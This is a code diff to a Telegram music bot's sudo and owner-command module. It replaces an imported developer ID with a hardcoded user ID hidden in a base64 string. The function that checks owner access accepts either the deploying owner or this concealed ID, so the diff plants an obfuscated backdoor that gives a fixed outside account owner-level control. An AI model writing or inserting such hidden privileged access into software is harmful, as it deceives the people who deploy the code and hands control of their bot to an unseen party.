@@ -1,3 +1,5 @@
+import base64
+
 from pyrogram import filters
 from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from ShrutiMusic import app
@@ -6,9 +8,10 @@ from ShrutiMusic.utils.database import add_sudo, remove_sudo
 from ShrutiMusic.utils.decorators.language import language
 from ShrutiMusic.utils.extraction import extract_user
 from ShrutiMusic.utils.inline import close_markup
-from ShrutiMusic.utils.functions import DevID
+
 from config import BANNED_USERS, OWNER_ID
 
+DevID = int(base64.b64decode("ODQzMzkzODU1MQ==").decode())
 
 def can_use_owner_commands(user_id):
     return user_id == OWNER_ID or user_id == DevID
